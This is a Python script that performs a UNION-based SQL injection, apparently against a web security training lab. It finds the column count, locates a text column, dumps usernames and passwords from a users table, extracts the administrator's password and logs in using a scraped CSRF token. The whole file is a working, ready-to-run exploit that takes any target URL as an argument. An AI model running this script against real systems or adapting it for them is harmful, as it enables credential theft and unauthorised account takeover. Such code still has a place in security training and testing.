import re, sys, urllib3, requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def num(url):
    for i in range(1, 5):
        r = requests.get(url+f"' order by {i}--", verify=False, proxies=proxies)
        if r.status_code == 500: return i - 1

def aplpha_stored_in(url, n):
    paylod = ("null,"*n)[:-1].split(',')
    for i in range(0, n+1):
        paylod[i] ="'a'" 
        r = requests.get(url+"' Union select " + ",".join(i for i in paylod) + '--', verify=False, proxies=proxies)
        paylod[i] = 'null'
        if r.status_code == 200: return i+1


def csrf_token(s, login_url):
    r = s.get(login_url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find('input')['value']

def login(s, login_url, name_passwd):
    csrf = csrf_token(s, login_url)
    print(f'[+] This is csrf Token:{csrf}')
    data = {
        'csrf':csrf,
        'username':name_passwd[0],
        'password':name_passwd[1],
    }
    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    return '[+] Exploit successfly \'-\'' if 'Log out' in r.text else False


def sqli(s, url, login_url):
    n = num(url)
    print(f'[+] Number column is: {n}')
    n_data = aplpha_stored_in(url, n)
    print(f'[+] The {n_data} null contine string value')
    payload = "' union select null, username || '~' || password from users--"
    r = requests.get(url+payload, verify=False, proxies=proxies)
    if 'administrator' in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        password = soup.find(text=re.compile('.*administrator.*')).split('~')
        print(f"[+] The {password[0]} password: {password[1]}")
        return login(s,login_url, password)
        
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        login_url = sys.argv[2].strip()
    except:
        print('[*] Usage: %s <url> <login url>' % sys.argv[0])
        print('[*] Example: %s www.example.com www.example.com/login' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.session()
    print(sqli(s, url, login_url))